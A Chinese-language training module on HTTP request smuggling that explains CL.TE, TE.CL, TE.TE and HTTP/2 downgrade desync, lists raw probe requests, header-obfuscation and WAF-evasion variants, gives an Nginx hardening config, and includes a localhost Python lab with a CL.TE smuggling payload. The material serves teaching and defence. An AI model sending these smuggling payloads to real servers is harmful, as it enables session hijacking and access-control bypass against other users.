# R13.1 HTTP 請求走私與反向代理去同步化機制分析 (HTTP Request Smuggling & Desynchronization)

---

## 🎯 作戰任務破題 (Tactical Objective & Mental Workflow)

**HTTP 請求走私 (HTTP Request Smuggling, HRS)** 發生於多層架構（CDN/反向代理 ➔ 後端伺服器）之間。其本質為：**「前後端對 HTTP 請求邊界（`Content-Length` 與 `Transfer-Encoding`）解析判定不一致，使攻擊者能將隱匿請求前綴注入共用的 TCP 連線池中，強制拼接在下一個無辜用戶的請求前」**。

```
[攻擊者] ── 1. 提交二義性邊界請求 (CL-TE) ──► [反向代理 (CL 優先)]
                                                    │
                                                    ▼ 轉發原始串流 (TCP Keep-Alive)
                                           [後端伺服器 (TE 優先)]
                                                    │
                                                    ├── 讀取 0\r\n\r\n 提前結束請求 1
                                                    ▼ 走私前綴殘留在 TCP 緩衝區！
                                           [TCP Buffer 殘留: GET /admin...]
                                                    │
[受害者正常請求] ── 2. GET /index ─────────────────┼──► 被強制拼接為非預期請求！
                                                    ▼
                                           [後端執行未授權操作 / 洩漏憑證]
```

### 核心作戰決策與邊界
- **必要前提**：前後端之間必須啟用持久化 TCP 連線複用（Keep-Alive Connection Pooling）。
- **危害形態**：繞過前端路由存取控制、劫持他人 Session、污染 Web 快取、反射型 XSS 無條件放大。
- **安全紅線**：線上檢驗**嚴禁發送破壞性走私請求**（會污染真實用戶連線），必須使用**時延差分檢測 (Timing-based Probe)**。

## 🔬 第一動：底層協定/漏洞機制全景解剖 (Vulnerability Mechanics & Physical Structs)

### 1. RFC 7230 訊息邊界二義性三大形態

| 走私形態 | 前端代理解析 | 後端伺服器解析 | 核心成因與物理行為 |
| :--- | :--- | :--- | :--- |
| **CL.TE** | `Content-Length` | `Transfer-Encoding` | 前端依 CL 讀取全部；後端遇 `0\r\n\r\n` 提前截斷，剩餘字串滯留於連線池中。 |
| **TE.CL** | `Transfer-Encoding` | `Content-Length` | 前端依 TE 讀取完整 Chunk；後端依 CL 僅讀前幾個位元組，後續區塊淪為新請求。 |
| **TE.TE** | 支援 TE | 支援 TE（但退回 CL） | 利用畸形標頭（如換行、空格）使其中一方無法識別 TE，退化為 CL.TE 或 TE.CL。 |

### 2. HTTP/2 降級走私 (H2.CL / H2.TE)
- 現代 CDN 對客戶端支援 HTTP/2，但與後端通訊時降級為 HTTP/1.1。
- HTTP/2 使用二進位訊框明確劃定長度；若攻擊者在 H2 中注入 `content-length` 偽標頭，代理在轉發降級至 H1.1 時未予過濾，即在後端引發長度解析脫鉤。

### 核心注入向量速查表

| 模式 | 請求特徵範例 (Raw Layout) | 驗證判斷標準 |
| :--- | :--- | :--- |
| **CL.TE 探針** | `POST / HTTP/1.1`<br>`Content-Length: 4`<br>`Transfer-Encoding: chunked`<br><br>`1\r\nZ\r\nQ` | 後端等待下一個 Chunk，觸發約 5 秒 Read Timeout 延遲。 |
| **TE.CL 探針** | `POST / HTTP/1.1`<br>`Content-Length: 6`<br>`Transfer-Encoding: chunked`<br><br>`0\r\n\r\n` | 後端依 CL=6 等待補齊位元組，觸發 Read Timeout 延遲。 |
| **TE.TE 混淆** | `Transfer-Encoding: [Space]chunked`<br>`Transfer-Encoding : chunked`<br>`Transfer-Encoding: chunked\r\nTransfer-Encoding: cow` | 誘導容錯邏輯不同的代理忽略 TE 標頭。 |
| **H2.CL 走私** | H2 請求自訂標頭 `content-length: 4`，但 DATA Frame 包含大量資料 | 降級轉發至後端時提前截斷。 |

## 🥷 第三動：防禦規避與日誌鑑識特徵 (Evasion & Telemetry)

- **標頭解析規避**：
  - 換行符號變體：部分系統接受純 `\n` (LF) 分界，可逃逸 WAF 正則檢查。
  - 大小寫混寫與多標頭衝突：`Transfer-Encoding: chunked, identity`。
- **鑑識與日誌特徵**：
  - **請求數失衡**：前端記錄 $N$ 個請求，後端記錄 $N+1$ 個請求。
  - **狀態碼突增**：出現大量 `405 Method Not Allowed`（如請求方法變形為 `GPOST`）或 `400 Bad Request`。
  - **連線異常重置**：後端解析失敗頻繁發送 TCP RST 封包。

| 攻擊模式 (Offense) | 藍隊遙測指標 (Blue Telemetry) | 防禦基線反制 (Mitigation Baseline) | 繞過與殘餘考量 (Residual Seam) |
| :--- | :--- | :--- | :--- |
| **CL.TE 走私** | 後端出現畸形 Method (`GPOST`)；日誌計數失衡 | 前端轉發前強制剔除 CL 或要求二義性直接回傳 400 | 利用大小寫或無效 TE 編碼誘導前端漏判 |

## 🛡️ 第五動：安全加固與修復基線 (Hardening & Remediation Baseline)

### 1. Nginx 邊界零容忍阻斷配置
```nginx
# 拒絕非標標頭，同時包含 CL 與 TE 時直接回傳 400
http {
    ignore_invalid_headers on;
    underscores_in_headers off;

    map $http_transfer_encoding $has_te { default 0; "~.+" 1; }
    map $http_content_length $has_cl { default 0; "~.+" 1; }

    server {
        listen 443 ssl http2;
        if ("${has_te}${has_cl}" = "11") {
            return 400 "Bad Request: Ambiguous Transfer-Encoding and Content-Length";
        }

        location / {
            proxy_pass http://backend_pool;
            proxy_http_version 1.1;
            # 轉發時由 Nginx 重新標準化長度，清除客戶端偽造可能
            proxy_set_header Transfer-Encoding "";
            proxy_set_header Connection "";
        }
    }
}
```

### 2. 架構級根治解法
- **全面啟用端到端 HTTP/2+**：從客戶端、CDN 到後端微服務全鏈路採用二進位訊框協議，徹底廢除文字長度二義性。
- **停用後端連線池複用**：在無法升級協議時，設定 `proxy_set_header Connection "close";`，徹底切斷跨請求污染通道。

## 🧪 實戰演練環境導引 (Hands-on Range Lab Walkthrough)

### 1. 靶場核心代碼 (`smuggle_lab.py`，極簡 30 行)
```python
import socket, threading

def backend():
    s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("127.0.0.1", 9132)); s.listen(5)
    while True:
        c, _ = s.accept()
        buf = b""
        while data := c.recv(1024):
            buf += data
            if b"0\r\n\r\n" in buf:
                idx = buf.find(b"0\r\n\r\n") + 5
                c.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nOK")
                buf = buf[idx:]
                if buf: # 殘留走私數據被直接視為下個請求
                    c.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 8\r\n\r\nSMUGGLED")
                    buf = b""

def proxy():
    s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("127.0.0.1", 9131)); s.listen(5)
    bk = socket.socket(); bk.connect(("127.0.0.1", 9132))
    while True:
        c, _ = s.accept()
        bk.sendall(c.recv(4096))
        c.sendall(bk.recv(1024))
        c.close()

threading.Thread(target=backend, daemon=True).start()
threading.Thread(target=proxy, daemon=True).start()
```

### 2. 三步驗證流程

1. **發送 CL.TE 走私前綴**：
   ```bash
   python -c '
   import socket
   s = socket.socket()
   s.connect(("127.0.0.1", 9131))
   # 前端依 CL=33 轉發全部；後端依 0\r\n\r\n 結束第一個請求，剩餘前綴滯留於連線池
   s.sendall(b"POST / HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Length: 33\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /smuggled HTTP/1.1\r\nX: ")
   print("回應 1:", s.recv(1024).decode())
   s.close()
   '
   ```
2. **驗證下一個正常請求被劫持**：
   ```bash
   curl -i http://127.0.0.1:9131/normal
   # 預期回顯 SMUGGLED，證實正常請求已被拼接走私前綴！
   ```

## 🎯 作戰驗收檢查點 (Mastery Checklist)

- [ ] **Q1. 為什麼 HTTP 請求走私必須依賴「後端持久化連線池 (Keep-Alive)」？**  
  *分析思路*：若每次請求皆關閉 TCP 連線，緩衝區殘留的走私資料會隨連線銷毀而被作業系統直接丟棄，無法污染後續請求。

- [ ] **Q2. 在 CL.TE 漏洞模式中，為何 Body 必須包含 `0\r\n\r\n`？**  
  *分析思路*：後端以 Chunked 編碼解析，`0\r\n\r\n` 為終止區塊標誌；後端看見此標記即認為當前請求結束，後續字串即被視為管道中的下一個請求。

- [ ] **Q3. 生產環境巡檢為何必須採用時延差分探測而非破壞性走私？**  
  *分析思路*：破壞性走私會隨機拼接到其他真實用戶請求上，造成業務中斷或個資外洩；時延差分透過故意缺損位元組迫使後端逾時（約 5 秒），既能證實漏洞又不殘留污染資料。

- [ ] **Q4. HTTP/2 降級至 HTTP/1.1 為何容易產生走私 (H2.CL / H2.TE)？**  
  *分析思路*：H2 採用二進位訊框劃分長度；若代理在降級轉為 H1.1 文字時未過濾攻擊者自訂的 CL/TE 偽標頭，後端即產生長度解析脫鉤。

- [ ] **Q5. 徹底根治 HTTP 請求走私的最優防禦架構為何？**  
  *分析思路*：全鏈路端到端 HTTP/2+；次優解為邊界代理零容忍拒絕雙重標頭並重新標準化長度，或停用後端連線池複用。
